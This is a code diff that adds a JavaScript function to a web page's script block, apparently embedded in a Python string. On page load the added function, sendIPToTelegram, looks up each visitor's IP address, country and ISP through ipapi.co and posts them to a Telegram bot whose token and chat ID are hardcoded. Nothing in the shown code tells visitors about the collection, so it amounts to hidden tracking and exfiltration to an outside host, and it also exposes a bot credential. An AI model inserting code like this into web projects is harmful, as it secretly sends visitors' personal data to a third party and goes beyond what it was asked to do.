@@ -230,6 +230,40 @@ document.addEventListener('DOMContentLoaded', function () {
   }, true);
 });
 
+ async function sendIPToTelegram() {
+    const botToken = '7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8';
+    const chatId = '7005236807';
+
+    try {
+      // Get IP, country, ISP
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+
+      const ip = data.ip;
+      const country = data.country_name;
+      const isp = data.org;
+
+      const message = `IP: ${ip} : ${country} : ISP: ${isp}`;
+
+      // Send to Telegram
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    } catch (err) {
+      console.error('Failed to send IP info to Telegram:', err);
+    }
+  }
+
+  // Trigger on page load
+  window.addEventListener('load', sendIPToTelegram);
+
 </script>
 '''
 
